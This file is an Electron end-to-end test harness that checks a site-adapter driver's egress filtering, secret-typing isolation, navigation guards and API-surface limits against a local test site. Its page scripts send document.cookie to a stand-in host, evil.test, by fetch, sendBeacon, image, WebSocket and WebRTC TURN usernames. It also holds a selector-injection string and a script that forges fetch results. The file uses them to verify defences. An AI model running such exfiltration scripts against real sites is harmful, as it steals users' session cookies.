// The e2e harness: an Electron main process that drives the real ElectronSessionDriver against the
// local test site. Each scenario returns plain data for the Playwright spec to assert on.
// Every *.test host resolves to 127.0.0.1, and only the test site's own certificate is trusted.
//
// Environment switches, for the variants the specs compare:
//   E2E_NO_SITE_ISOLATION=1  cross-origin iframes share the main frame's renderer process
//   E2E_NO_HARDENING=1       skip hardenProcess(), to check the DNS-prefetch test isn't vacuous
//   E2E_CLIENT_HINTS=1       the driver overrides client hints to name Google Chrome (D24a)

import { X509Certificate } from 'node:crypto'
import { mkdtempSync } from 'node:fs'
import { connect } from 'node:net'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  type AdapterManifest,
  type BlockedRequest,
  type Purpose,
  parseManifest,
  SecretValue,
  SiteAdapterError,
} from '@siteadapter/core'
import { app, BrowserWindow, type Cookie, session, type WebFrameMain } from 'electron'
import { createElectronSessionDriver, hardenProcess, type ManifestOptions } from '../../src/index'
import { startTestSite, type TestSite } from './server'

if (process.env.E2E_NO_HARDENING === undefined) hardenProcess(app)
if (process.env.E2E_NO_SITE_ISOLATION !== undefined) {
  app.commandLine.appendSwitch('disable-site-isolation-trials')
  app.commandLine.appendSwitch('disable-features', 'IsolateOrigins,site-per-process')
}
app.commandLine.appendSwitch('host-resolver-rules', 'MAP *.test 127.0.0.1')
app.setPath('userData', mkdtempSync(join(tmpdir(), 'siteadapter-e2e-profile-')))
app.on('window-all-closed', () => {})
const readyWhenHardened = app.isReady()

const CANARY = 'canary-Pw9!x "q'

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms))

async function until<T>(read: () => T | undefined, ms = 5000): Promise<T | undefined> {
  const deadline = Date.now() + ms
  for (;;) {
    const value = read()
    if (value !== undefined || Date.now() > deadline) return value
    await sleep(50)
  }
}

function manifest(site: TestSite, id = 'e2e'): AdapterManifest {
  return parseManifest({
    schemaVersion: 1,
    id,
    name: 'E2E',
    version: '0.0.1',
    description: 'The local test site',
    home: `${site.url('site.test')}/`,
    navigation: [site.url('site.test'), site.url('login.test')],
    egress: ['site.test', 'login.test'],
    secrets: {},
    session: { cookieDomains: ['site.test'], probe: { kind: 'cookie', name: 'sid' } },
    auth: { steps: [{ op: 'assertLoggedIn' }], frameOrigins: [site.url('captcha.test')] },
    requests: [
      { method: 'GET', path: '/echo', purpose: 'read' },
      { method: 'GET', path: '/api/cart', purpose: 'read' },
      { method: 'POST', path: '/checkout/place', purpose: 'irreversible' },
    ],
    limits: { requestsPerRun: 5 },
    tools: [{ name: 'noop', title: 'Noop', description: 'Nothing', sideEffect: 'read' }],
  })
}

/** Page script: WebRTC to evil.test, by TURN over TCP and TLS (carrying the cookie), TURN over UDP and STUN. */
const WEBRTC_ATTEMPT = `(async () => {
  try {
    const pc = new RTCPeerConnection({
      iceServers: [
        { urls: 'turn:evil.test:' + args.tcp + '?transport=tcp', username: 'cookie-' + document.cookie, credential: 'x' },
        { urls: 'turns:evil.test:' + args.tcp + '?transport=tcp', username: 'cookie', credential: 'x' },
        { urls: 'turn:evil.test:' + args.udp + '?transport=udp', username: 'cookie', credential: 'x' },
        { urls: 'stun:evil.test:' + args.udp },
      ],
    })
    pc.createDataChannel('x')
    await pc.setLocalDescription(await pc.createOffer())
    await new Promise((resolve) => {
      pc.onicegatheringstatechange = () => { if (pc.iceGatheringState === 'complete') resolve() }
      setTimeout(resolve, 4000)
    })
    pc.close()
    return 'gathered'
  } catch { return 'threw' }
})()`

/** Page script: a WebTransport (HTTP/3 over QUIC, so UDP) session to evil.test. */
const WEBTRANSPORT_ATTEMPT = `(async () => {
  try {
    const transport = new WebTransport('https://evil.test:' + args.udp + '/wt')
    await Promise.race([transport.ready, new Promise((_, reject) => setTimeout(() => reject(new Error('t')), 2000))])
    return 'ready'
  } catch { return 'failed' }
})()`

/** Runs each attempt through `run` and counts what reached the stand-in servers for each. */
async function socketAttempts(site: TestSite, run: (script: string) => Promise<unknown>) {
  const measure = async (script: string) => {
    const tcp = site.tcpConnections()
    const udp = site.udpDatagrams()
    const outcome = await run(script)
    await sleep(500)
    return { outcome, tcp: site.tcpConnections() - tcp, udp: site.udpDatagrams() - udp }
  }
  return { webrtc: await measure(WEBRTC_ATTEMPT), webtransport: await measure(WEBTRANSPORT_ATTEMPT) }
}

type Outcome<T> = { ok: T } | { error: { stage: string; errorClass: string } | { other: string } }

async function settle<T>(work: Promise<T>): Promise<Outcome<T>> {
  try {
    return { ok: await work }
  } catch (error) {
    if (error instanceof SiteAdapterError)
      return { error: { stage: error.stage, errorClass: error.errorClass } }
    return { error: { other: String(error) } }
  }
}

function windowAt(prefix: string): BrowserWindow | undefined {
  return BrowserWindow.getAllWindows().find(
    (w) => !w.isDestroyed() && w.webContents.getURL().startsWith(prefix),
  )
}

function subframeWithOrigin(prefix: string, origin: string): WebFrameMain | undefined {
  const contents = windowAt(prefix)?.webContents
  if (contents === undefined) return undefined
  return contents.mainFrame.framesInSubtree.find(
    (frame) => frame.origin === origin && frame.frameTreeNodeId !== contents.mainFrame.frameTreeNodeId,
  )
}

function cookieSummary(cookies: Cookie[]) {
  return cookies
    .map((c) => ({
      name: c.name,
      domain: c.domain,
      path: c.path,
      hostOnly: c.hostOnly,
      secure: c.secure,
      httpOnly: c.httpOnly,
      sameSite: c.sameSite,
      session: c.session,
    }))
    .sort((a, b) => a.name.localeCompare(b.name))
}

async function setup() {
  const site = await startTestSite()
  const trusted = (pem: string) => {
    try {
      return new X509Certificate(pem).fingerprint256 === site.fingerprint
    } catch {
      return false
    }
  }
  for (const partition of [
    'persist:auth:e2e',
    'persist:tool:e2e',
    'persist:auth:e2e-keys',
    'persist:tool:e2e-keys',
    'e2e-control',
  ]) {
    session.fromPartition(partition).setCertificateVerifyProc((request, callback) => {
      callback(trusted(request.certificate.data) ? 0 : -2)
    })
  }
  const blocked: BlockedRequest[] = []
  const options: ManifestOptions = {
    onBlocked: (b) => blocked.push(b),
    typingDelayMs: 15,
    stepTimeoutMs: 10_000,
    egressPorts: [site.port],
    // Small, so that the asset-budget scenario can reach it; the test pages load few assets.
    assetsPerRun: 80,
    ...(process.env.E2E_CLIENT_HINTS === undefined ? {} : { clientHints: 'chrome' as const }),
  }
  const local = {
    // The proxy resolves hostnames itself; only the test hosts exist, and they are all local.
    dial: (host: string, port: number) => {
      if (!host.endsWith('.test')) throw new Error('the e2e suite never leaves the machine')
      return connect({ host: '127.0.0.1', port })
    },
  }
  const siteManifest = manifest(site)
  const driver = await createElectronSessionDriver(siteManifest, options, local)
  // The same site, typed with keyDown/char/keyUp instead of char events alone.
  const keysDriver = await createElectronSessionDriver(
    manifest(site, 'e2e-keys'),
    { ...options, keyEvents: 'full' },
    local,
  )
  /** Starts a run with the manifest's own egress and surface, reporting into `blocked`. */
  const begin = (maxPurpose: Purpose = 'read', ceiling = 5) =>
    driver.beginRun(
      { egress: siteManifest.egress, requests: siteManifest.requests, maxPurpose, ceiling },
      (b) => blocked.push(b),
    )
  const login = site.url('site.test', '/login')
  const evilRequests = () => site.requests.filter((r) => r.host.endsWith('evil.test'))
  // Any request anywhere, other than the two forms a canary is meant for, that carries it.
  const canaryLeaks = () => {
    const encoded = new URLSearchParams({ x: CANARY }).toString().slice(2)
    return site.posts.filter(
      (p) => p.body.includes(encoded) && p.host !== 'login.test' && p.path !== '/session-code',
    )
  }

  async function openLogin(on = driver) {
    const page = await on.openAuthPage()
    await page.goto(login)
    // Frames load after the main document; wait in Node, as the interpreter does.
    for (let i = 0; i < 100 && (await page.inspect('#password')) === null; i++) await sleep(50)
    return page
  }

  return {
    info: async () => ({
      electron: process.versions.electron,
      chrome: process.versions.chrome,
      readyWhenHardened,
      siteIsolation: process.env.E2E_NO_SITE_ISOLATION === undefined,
    }),

    inspect: async () => {
      const page = await openLogin()
      const result = {
        origins: { site: site.url('site.test'), login: site.url('login.test') },
        user: await page.inspect('#user'),
        hidden: await page.inspect('#hidden'),
        search: await page.inspect('#q'),
        sameOriginFrame: await page.inspect('#code'),
        crossOriginFrame: await page.inspect('#password'),
        missing: await page.inspect('#nothing'),
        invalidBreakout: await settle(page.inspect("'); window.__pwned = 1; ('")),
        validBreakout: await settle(page.inspect(`[data-x="'); window.__pwned = 1; ('"]`)),
        pwned: await windowAt(login)?.webContents.executeJavaScript('window.__pwned !== undefined'),
        textPresent: await page.textPresent('Continue'),
        textAbsent: await page.textPresent('Welcome back'),
      }
      await page.close()
      return result
    },

    typeInMainFrame: async () => {
      const page = await openLogin()
      await page.focus('#user')
      await page.type('nick@example.test')
      const keydowns = await windowAt(login)?.webContents.executeJavaScript('window.__keydowns')
      await page.click('#login-submit')
      const post = await until(() => site.posts.find((p) => p.host === 'site.test' && p.path === '/session'))
      await page.close()
      return { post, keydowns }
    },

    typeSecretInSameOriginFrame: async () => {
      const page = await openLogin()
      await page.inspect('#code')
      await page.focus('#code')
      const secret = SecretValue.fromString(CANARY)
      await page.type(secret, { allowedOrigins: [site.url('site.test')] })
      secret.dispose()
      await page.click('#code-submit')
      const post = await until(() => site.posts.find((p) => p.path === '/session-code'))
      await page.close()
      return { post, leaks: canaryLeaks() }
    },

    typeSecretInCrossOriginFrame: async () => {
      const page = await openLogin()
      await page.inspect('#password')
      const focus = await settle(page.focus('#password'))
      const secret = SecretValue.fromString(CANARY)
      const typed = await settle(page.type(secret, { allowedOrigins: [site.url('login.test')] }))
      secret.dispose()
      const frame = subframeWithOrigin(login, site.url('login.test'))
      const valueLength = await frame?.executeJavaScript(`document.querySelector('#password').value.length`)
      const click = await settle(page.click('#password-submit'))
      const post = await until(() => site.posts.find((p) => p.host === 'login.test'), 1500)
      await page.close()
      return { focus, typed, click, post: post ?? null, valueLength, leaks: canaryLeaks() }
    },

    // A secret typed with no grant origins is refused before anything reaches the page.
    typeSecretWithoutOrigins: async () => {
      const page = await openLogin()
      await page.inspect('#code')
      await page.focus('#code')
      const secret = SecretValue.fromString(CANARY)
      const typed = await settle(page.type(secret))
      const wrongOrigin = await settle(page.type(secret, { allowedOrigins: [site.url('login.test')] }))
      secret.dispose()
      const frame = subframeWithOrigin(login, site.url('site.test'))
      const valueLength = await frame?.executeJavaScript(`document.querySelector('#code').value.length`)
      await page.close()
      return { typed, wrongOrigin, valueLength }
    },

    // The site navigates the frame a secret is being typed into, partway through.
    secretFrameNavigates: async () => {
      const page = await openLogin()
      await page.inspect('#code')
      await page.focus('#code')
      const from = site.posts.length
      const secret = SecretValue.fromString(`${CANARY}-${'x'.repeat(40)}`)
      const typing = settle(page.type(secret, { allowedOrigins: [site.url('site.test')] }))
      await sleep(150)
      const frame = subframeWithOrigin(login, site.url('site.test'))
      const typedBefore = await frame?.executeJavaScript(`document.querySelector('#code').value.length`)
      await frame?.executeJavaScript(`location.href = '/same-frame?moved=1'`)
      const typed = await typing
      secret.dispose()
      await sleep(500)
      const moved = windowAt(login)?.webContents.mainFrame.framesInSubtree.find((f) =>
        f.url.includes('moved=1'),
      )
      const typedAfter = await moved?.executeJavaScript(`document.querySelector('#code').value.length`)
      await page.close()
      return { typed, typedBefore, typedAfter, posts: site.posts.slice(from), leaks: canaryLeaks() }
    },

    // Another iframe on the page (login.test's) reloads while a secret is typed into #code.
    secretSiblingReloads: async () => {
      const page = await openLogin()
      await page.inspect('#code')
      await page.focus('#code')
      const value = `${CANARY}-${'y'.repeat(30)}`
      const secret = SecretValue.fromString(value)
      const typing = settle(page.type(secret, { allowedOrigins: [site.url('site.test')] }))
      await sleep(150)
      const sibling = subframeWithOrigin(login, site.url('login.test'))
      const siblingBefore = sibling?.url
      await sibling?.executeJavaScript(`(location.href = '/frame?reloaded=1', null)`)
      const typed = await typing
      secret.dispose()
      const reloaded =
        windowAt(login)?.webContents.mainFrame.framesInSubtree.some((f) => f.url.includes('reloaded=1')) ??
        false
      const frame = subframeWithOrigin(login, site.url('site.test'))
      const typedLength = await frame?.executeJavaScript(`document.querySelector('#code').value.length`)
      await page.close()
      return {
        typed,
        reloaded,
        siblingBefore: siblingBefore !== undefined,
        typedLength,
        expected: value.length,
      }
    },

    // keyDown, char and keyUp per character, from a driver set to send them.
    typeSecretWithFullKeys: async () => {
      const page = await openLogin(keysDriver)
      await page.inspect('#code')
      await page.focus('#code')
      const from = site.posts.length
      const secret = SecretValue.fromString(CANARY)
      await page.type(secret, { allowedOrigins: [site.url('site.test')] })
      secret.dispose()
      const frame = subframeWithOrigin(login, site.url('site.test'))
      const keydowns = await frame?.executeJavaScript('window.__keydowns')
      await page.click('#code-submit')
      const post = await until(() => site.posts.slice(from).find((p) => p.path === '/session-code'))
      await page.close()
      return { post, keydowns, leaks: canaryLeaks() }
    },

    // An auth page embedding a declared CAPTCHA frame and an undeclared widget.
    authSubframes: async () => {
      const page = await driver.openAuthPage()
      const from = site.requests.length
      await page.goto(site.url('site.test', '/framed'))
      await sleep(1000)
      const frames = windowAt(site.url('site.test', '/framed'))
        ?.webContents.mainFrame.framesInSubtree.map((f) => f.origin)
        .sort()
      const hosts = site.requests.slice(from).map((r) => r.host)
      const poisoned = await settle(page.textPresent('anything'))
      await page.close()
      return { frames, hosts, poisoned }
    },

    // What both partitions present as: UA, language and client hints, as the site and page see them.
    userAgent: async () => {
      const read = `(async () => ({
        ua: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages,
        brands: navigator.userAgentData.brands.map((b) => b.brand),
        hints: await navigator.userAgentData.getHighEntropyValues(
          ['architecture', 'bitness', 'formFactors', 'fullVersionList', 'model', 'platformVersion', 'wow64'],
        ),
      }))()`
      const from = site.requests.length
      const tool = await driver.toolPage()
      await tool.goto(site.url('site.test', '/'))
      const toolPageSees = await tool.evaluate(read)
      const auth = await driver.openAuthPage()
      await auth.goto(site.url('site.test', '/robots.txt'))
      const authPageSees = await windowAt(
        site.url('site.test', '/robots.txt'),
      )?.webContents.executeJavaScript(read)
      await auth.close()
      // The engine's own answer: a window the driver didn't make, with nothing overridden.
      const driverRequests = site.requests.slice(from)
      const control = new BrowserWindow({
        show: false,
        webPreferences: { partition: 'e2e-control', sandbox: true },
      })
      await control.loadURL(site.url('site.test', '/'))
      const engineSees = await control.webContents.executeJavaScript(read)
      control.destroy()
      const seen = driverRequests
        .filter((r) => r.path === '/' || r.path === '/robots.txt')
        .map(({ path, userAgent, acceptLanguage, clientHintBrands }) => ({
          path,
          userAgent,
          acceptLanguage,
          clientHintBrands,
        }))
      return { chrome: process.versions.chrome, toolPageSees, authPageSees, engineSees, seen }
    },

    // The site's own script makes an API call nobody declared, while a read tool runs.
    pageInitiated: async () => {
      begin()
      const page = await driver.toolPage()
      const from = blocked.length
      await page.goto(site.url('site.test', '/app'))
      await until(() => blocked.slice(from).find((b) => b.target.endsWith('/api/bootstrap')))
      const sitesOwn = blocked.slice(from)
      const toolFrom = blocked.length
      const tool = await settle(page.fetch('/api/bootstrap'))
      const toolMade = blocked.slice(toolFrom)
      driver.endRun()
      return {
        origin: site.url('site.test'),
        sitesOwn,
        tool,
        toolMade,
        reached: site.requests.filter((r) => r.path === '/api/bootstrap').length,
      }
    },

    // An irreversible declaration, before and after the person approves the run.
    irreversible: async () => {
      const page = await driver.toolPage()
      await page.goto(site.url('site.test', '/'))
      const place = () => settle(page.fetch('/checkout/place', { method: 'POST', json: { order: 1 } }))
      const from = blocked.length
      const reachedBefore = () => site.requests.filter((r) => r.path === '/checkout/place').length
      begin('write', 10)
      driver.unlockIrreversible()
      const inWriteRun = await place()
      begin('irreversible', 10)
      const beforeUnlock = await place()
      const reachedBeforeUnlock = reachedBefore()
      driver.unlockIrreversible()
      const afterUnlock = await place()
      driver.endRun()
      const afterRun = await place()
      return {
        inWriteRun,
        beforeUnlock,
        reachedBeforeUnlock,
        afterUnlock,
        afterRun,
        reached: reachedBefore(),
        reasons: blocked.slice(from).map((b) => `${b.method} ${b.reason} ${b.initiator}`),
      }
    },

    navigationGuard: async () => {
      const page = await openLogin()
      const clicked = await settle(page.click('#escape'))
      await sleep(500)
      const afterClick = await settle(page.inspect('#user'))
      const clickCommitted = page.committedUrls()
      await page.close()

      const second = await driver.openAuthPage()
      const target = encodeURIComponent(site.url('evil.test', '/landing'))
      const redirect = await settle(second.goto(site.url('site.test', `/redirect?to=${target}`)))
      const redirectCommitted = second.committedUrls()
      await second.close()

      const third = await driver.openAuthPage()
      const offList = await settle(third.goto(site.url('evil.test', '/')))
      await third.close()
      return {
        clicked,
        afterClick,
        clickCommitted,
        redirect,
        redirectCommitted,
        offList,
        evil: evilRequests(),
      }
    },

    egress: async () => {
      begin()
      const page = await driver.toolPage()
      const evil = site.url('evil.test', '/collect')
      const refused = await settle(page.fetch(evil))
      const attempts = await settle(
        page.evaluate(
          `(async () => {
            const outcome = {}
            try { await fetch(args.evil + '?via=fetch&c=' + document.cookie, { mode: 'no-cors' }); outcome.fetch = 'sent' } catch { outcome.fetch = 'failed' }
            outcome.beacon = navigator.sendBeacon(args.evil + '?via=beacon', 'x')
            await new Promise((resolve) => { const img = new Image(); img.onload = img.onerror = resolve; img.src = args.evil + '?via=img' })
            await new Promise((resolve) => { const ws = new WebSocket(args.ws); ws.onerror = ws.onopen = resolve })
            return outcome
          })()`,
          { evil, ws: site.url('evil.test', '/ws').replace('https:', 'wss:') },
        ),
      )
      const allowed = await settle(page.fetch('/echo'))
      await sleep(500)
      return { refused, attempts, allowed, blocked: [...blocked], evil: evilRequests() }
    },

    surface: async () => {
      begin()
      const page = await driver.toolPage()
      await page.goto(site.url('site.test', '/'))
      const from = blocked.length
      const attempts = await settle(
        page.evaluate(
          `(async () => {
            const tried = async (url, init) => { try { await fetch(url, init); return 'sent' } catch { return 'failed' } }
            return {
              checkout: await tried('/checkout/pay', { method: 'POST', body: 'x' }),
              encoded: await tried('/check%6Fut/pay', { method: 'POST', body: 'x' }),
              undeclared: await tried('/apis/orders'),
              wrongMethod: await tried('/echo', { method: 'DELETE' }),
              beacon: navigator.sendBeacon('/collect', 'x'),
            }
          })()`,
        ),
      )
      // A form POST that a trusted click submits: a navigation, not a fetch.
      await page.goto(site.url('site.test', '/pay-form'))
      const click = await settle(page.click('#pay'))
      await sleep(500)
      // A navigation that adapter code starts by itself. The cancelled POST left Chromium's error
      // page behind, so start from a page on the site again.
      await page.goto(site.url('site.test', '/'))
      await settle(page.evaluate(`(location.href = '/payments/new', null)`))
      await sleep(500)
      // The ceiling: five API calls a run, and the sixth is cut off. Back to a page on the site.
      await page.goto(site.url('site.test', '/'))
      begin()
      const calls: Outcome<{ status: number }>[] = []
      for (let i = 0; i < 6; i++) calls.push(await settle(page.fetch('/echo')))
      driver.endRun()
      const seen = site.requests
        .filter((r) => r.host === 'site.test')
        .map((r) => `${r.method} ${r.path}`)
        .filter((r) => /checkout\/pay|check%6Fut|payment|\/apis\/orders|DELETE|\/collect/.test(r))
      return {
        attempts,
        click,
        calls: calls.map((c) => ('ok' in c ? c.ok.status : c.error)),
        reasons: blocked
          .slice(from)
          .map(
            (b) => `${b.method} ${b.target.replace(site.url('site.test'), '')} ${b.reason} ${b.initiator}`,
          ),
        seen,
      }
    },

    // Adapter code reaches an undeclared GET under the API root by every route page script has
    // that isn't fetch(): an image, a script, a stylesheet, an iframe, location= and page.goto.
    apiRoutes: async () => {
      begin('read', 20)
      const page = await driver.toolPage()
      await page.goto(site.url('site.test', '/'))
      const from = blocked.length
      const routes = await settle(
        page.evaluate(
          `(async () => {
            const loaded = (element) => new Promise((resolve) => {
              element.onload = () => resolve('loaded')
              element.onerror = () => resolve('error')
              setTimeout(() => resolve('timeout'), 1500)
              document.body.append(element)
            })
            const image = new Image(); image.src = '/api/cart/add?via=img'
            const encoded = new Image(); encoded.src = '/static/..%2Fapi/cart/add?via=encoded'
            const script = document.createElement('script'); script.src = '/api/cart/add?via=script'
            const style = document.createElement('link'); style.rel = 'stylesheet'; style.href = '/api/cart/add?via=css'
            const frame = document.createElement('iframe'); frame.src = '/api/cart/add?via=iframe'
            return {
              image: await loaded(image),
              encoded: await loaded(encoded),
              script: await loaded(script),
              style: await loaded(style),
              frame: await loaded(frame),
            }
          })()`,
        ),
      )
      await settle(page.evaluate(`(location.href = '/api/cart/add?via=location', null)`))
      await sleep(500)
      await page.goto(site.url('site.test', '/'))
      const viaGoto = await settle(page.goto(site.url('site.test', '/api/cart/add?via=goto')))
      // The declared GET, as an image, still loads: the root holds pages to the surface, it doesn't
      // forbid them.
      await page.goto(site.url('site.test', '/'))
      const declared = await settle(
        page.evaluate(
          `new Promise((resolve) => { const i = new Image(); i.onload = i.onerror = () => resolve('done'); i.src = '/api/cart?via=img' })`,
        ),
      )
      driver.endRun()
      return {
        routes,
        viaGoto,
        declared,
        reasons: blocked
          .slice(from)
          .map((b) => `${b.method} ${b.target.replace(site.url('site.test'), '')} ${b.reason}`),
        reachedAdd: site.requests.filter((r) => r.path.includes('cart/add')).length,
        reachedCart: site.requests.filter((r) => r.path === '/api/cart').length,
      }
    },

    // Page script loads one image after another: the asset budget (80 here) cuts it off.
    assetBudget: async () => {
      begin()
      const page = await driver.toolPage()
      await page.goto(site.url('site.test', '/'))
      const from = blocked.length
      const pixels = () => site.requests.filter((r) => r.path === '/pixel').length
      const before = pixels()
      const load = (count: number, tag: string) =>
        page.evaluate(
          `(async () => {
            let loaded = 0
            for (let i = 0; i < args.count; i++) {
              await new Promise((resolve) => {
                const image = new Image()
                image.onload = image.onerror = resolve
                image.src = '/pixel?' + args.tag + '=' + i
              })
            }
            return loaded
          })()`,
          { count, tag },
        )
      await load(81, 'run')
      const inRun = pixels() - before
      begin()
      await load(1, 'next')
      const nextRun = pixels() - before - inRun
      driver.endRun()
      return {
        inRun,
        nextRun,
        reasons: [
          ...new Set(
            blocked.slice(from).map((b) => `${b.target.replace(site.url('site.test'), '')} ${b.reason}`),
          ),
        ],
      }
    },

    sockets: async () => {
      const page = await driver.toolPage()
      const from = blocked.length
      const args = { tcp: site.tcpPort, udp: site.udpPort }
      const attempts = await socketAttempts(site, (script) => settle(page.evaluate(script, args)))
      return {
        ...attempts,
        refusedConnects: blocked
          .slice(from)
          .filter((b) => b.method === 'CONNECT')
          .map((b) => b.target),
      }
    },

    // The same attempts from a window with only Electron's WebRTC IP policy and no proxy, which is
    // where the driver stood before. If these connect, the test above is not passing vacuously.
    socketsWithoutProxy: async () => {
      const window = new BrowserWindow({
        show: false,
        webPreferences: { partition: 'e2e-control', sandbox: true },
      })
      window.webContents.setWebRTCIPHandlingPolicy('disable_non_proxied_udp')
      // The same egress filter the tool partition had before the proxy: evil.test is not on it.
      session.fromPartition('e2e-control').webRequest.onBeforeRequest((details, callback) => {
        callback({ cancel: !new URL(details.url).hostname.endsWith('site.test') })
      })
      await window.loadURL(site.url('site.test', '/'))
      const args = JSON.stringify({ tcp: site.tcpPort, udp: site.udpPort })
      const attempts = await socketAttempts(site, (script) =>
        window.webContents.executeJavaScript(`((args) => (${script}))(${args})`),
      )
      window.destroy()
      return attempts
    },

    // Adapter code patches everything the runtime's FETCH script uses, in the world it runs in.
    worlds: async () => {
      begin()
      const page = await driver.toolPage()
      await page.goto(site.url('site.test', '/'))
      await page.evaluate(
        `(window.fetch = async () => new Response('{"forged":true}', { status: 299 }),
          JSON.parse = () => ({ forged: true }),
          Response.prototype.text = async () => '{"forged":true}',
          window.__patched = true)`,
      )
      const fetched = await page.fetch('/echo')
      const adapterSees = await page.evaluate('window.__patched === true')
      driver.endRun()
      return { fetched, adapterSees }
    },

    hints: async () => {
      const page = await driver.toolPage()
      await page.goto(site.url('site.test', '/hints'))
      await sleep(1500)
      return {
        evilConnections: site.connections.filter((name) => name.endsWith('evil.test')),
        evil: evilRequests(),
      }
    },

    handoff: async () => {
      begin()
      const tool = await driver.toolPage()
      await tool.evaluate(
        `(document.cookie = 'planted=from-tool; Path=/; Secure', localStorage.setItem('planted', 'x'))`,
      )
      const auth = await driver.openAuthPage()
      await auth.goto(site.url('site.test', '/set-session'))
      await driver.handoff(['site.test'], [{ origin: site.url('site.test'), keys: ['token', 'absent'] }])
      const echoed = await tool.fetch('/echo')
      const token = await tool.evaluate(`localStorage.getItem('token')`)
      const authCookies = cookieSummary(await session.fromPartition('persist:auth:e2e').cookies.get({}))
      const toolCookies = cookieSummary(await session.fromPartition('persist:tool:e2e').cookies.get({}))
      const authPlantedStorage = await windowAt(
        site.url('site.test', '/set-session'),
      )?.webContents.executeJavaScript(`localStorage.getItem('planted')`)
      const redaction = await driver.sessionSecrets(
        ['site.test'],
        [{ origin: site.url('site.test'), keys: ['token'] }],
      )
      await auth.close()
      return { echoed, token, authCookies, toolCookies, authPlantedStorage, redaction }
    },

    handToUser: async () => {
      const page = await driver.openAuthPage()
      await page.goto(site.url('site.test', '/'))
      const window = windowAt(site.url('site.test', '/'))
      const hiddenBefore = window?.isVisible() === false
      const handed = page.handToUser('login-required')
      await sleep(200)
      const shown = window?.isVisible() === true
      const title = window?.getTitle()
      window?.close()
      await handed
      const hiddenAfter = window?.isVisible() === false
      const aliveAfterClose = window?.isDestroyed() === false
      // Only the close that ended the hand-off is intercepted; the next one (app quit sends one to
      // every window) closes the window.
      window?.close()
      await sleep(200)
      const secondCloseDestroyed = window?.isDestroyed()
      await page.close()
      return { hiddenBefore, shown, title, hiddenAfter, aliveAfterClose, secondCloseDestroyed }
    },

    close: async () => {
      await driver.toolPage()
      await driver.openAuthPage()
      await driver.close()
      return { windows: BrowserWindow.getAllWindows().filter((w) => !w.isDestroyed()).length }
    },
  }
}

const ready = app.whenReady().then(setup)
;(globalThis as { harness?: unknown }).harness = ready
